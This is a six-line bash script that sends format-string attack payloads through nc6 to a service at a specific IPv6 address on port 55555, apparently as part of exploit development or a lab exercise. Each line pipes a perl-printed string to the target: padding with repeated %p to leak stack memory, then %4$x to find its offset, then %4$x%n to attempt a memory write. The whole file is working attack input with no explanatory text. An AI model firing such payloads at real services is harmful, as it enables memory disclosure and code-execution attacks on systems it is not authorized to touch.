#!/bin/bash

perl -e 'print "A%p%p%p%p%p%p%p%p%p%p\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "AA%p%p%p%p%p%p%p%p%p%p\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "AAA%p%p%p%p%p%p%p%p%p%p\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "AAAA%p%p%p%p%p%p%p%p%p%p\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "AAAA%4\$x\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
perl -e 'print "AAAA%4\$x%n\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
